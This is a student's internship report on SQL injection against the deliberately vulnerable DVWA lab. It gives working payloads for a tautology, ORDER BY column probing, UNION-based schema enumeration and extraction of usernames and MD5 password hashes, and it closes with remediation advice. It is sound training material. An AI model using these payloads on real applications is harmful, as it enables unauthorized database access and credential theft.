# Task 1 — SQL Injection (DVWA)

**Student:** Collins  
**Internship:** Ethical Hacking Internship, TechBiz Academy  
**Task:** Week 5 · Task 1  
**Lab target:** DVWA, Low security

## Objective

I tested whether the DVWA User ID input was inserted into a SQL query without proper handling. I then used UNION-based SQL injection to identify the database structure and retrieve the usernames and password hashes stored in the `users` table.

## Lab setup

- Set the DVWA security level to **Low**.
- Opened the SQL Injection module.
- Used the User ID input field and observed the page response.

The report describes the vulnerable query as:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

## Practical steps and results

### 1. Basic tautology test

Payload:

```sql
' OR '1'='1
```

The page returned all five displayed users — admin, Gordon Brown, Hack Me, Pablo Picasso and Bob Smith — instead of one record. This showed that the input was not safely handled at the Low security level.

### 2. Identify the column count

I tested the query with successive ORDER BY values:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

ORDER BY 1 and ORDER BY 2 returned normal page responses. ORDER BY 3 produced a 500 Internal Server Error. I concluded that the original query returned two columns, matching the first-name and last-name fields displayed by DVWA.

### 3. Enumerate tables and columns

I queried the MySQL information schema:

```sql
' UNION SELECT table_name,2 FROM information_schema.tables-- -
```

Then I enumerated the columns belonging to the `users` table:

```sql
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
```

The table list included DVWA's `users` table. The column list included `user` and `password`, which were the fields used for the extraction step.

### 4. Extract usernames and password hashes

Payload:

```sql
' UNION SELECT user, password FROM users-- -
```

The report records five username/hash pairs:

| Username | Password hash (MD5) |
|---|---|
| admin | `5f4dcc3b5aa765d61d8327deb882cf99` |
| gordonb | `e99a18c428cb38d5f260853678922e03` |
| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` |
| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` |
| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` |

The admin and smithy accounts had the same hash, indicating password reuse. The report notes that the hashes were unsalted MD5 values.

## TryHackMe practice

I completed both rooms at 100%:

- [SQL Injection](https://tryhackme.com/room/sqlinjectionlm) — practised in-band, error-based, blind Boolean, time-based and out-of-band SQL injection concepts.
- [SQL Injection Lab](https://tryhackme.com/room/sqlilab) — practised multiple vulnerable input contexts, UNION-based extraction and blind Boolean techniques.

## Security impact

An attacker who can alter a database query may retrieve information beyond the record the application intended to return. In this exercise, the vulnerable input exposed the users table and its password hashes. Password reuse increased the potential impact because two accounts shared the same hash.

## Remediation

- Use parameterized queries or prepared statements instead of concatenating user input into SQL.
- Validate and allow-list input where the application expects a constrained value, such as a numeric ID.
- Use an ORM carefully and avoid raw query concatenation.
- Apply least privilege to the database account used by the application.
- Store passwords with a strong salted password-hashing algorithm such as bcrypt or Argon2, not MD5.
- Treat a WAF as an additional layer, not a replacement for fixing the vulnerable query.
- Disable detailed database errors in production.
- Monitor application/database activity for suspicious patterns such as UNION SELECT and unexpected information_schema access.

## Evidence

The submitted 11-page PDF report contains the practical screenshots. The following page references identify the evidence in that source report:

| Evidence | Source report page |
|---|---:|
| DVWA security level set to Low | 3 |
| Basic tautology returning all users | 4 |
| ORDER BY 3 error and column-count result | 5 |
| Table and column enumeration | 6–7 |
| Usernames and password hashes extracted | 8 |
| TryHackMe SQL Injection room completion | 9 |
| TryHackMe SQL Injection Lab completion | 10 |

**Original report:** `Week5_Task1_SQL Injection_Collins.pdf` (11 pages; supplied separately in this conversation).

## Conclusion

I confirmed that the DVWA Low security SQL Injection page was vulnerable to unsanitized input. I used a tautology payload to return all users, identified the two-column query structure, enumerated the database schema and extracted five username/hash pairs. The exercise reinforced why parameterized queries and secure password storage are essential.
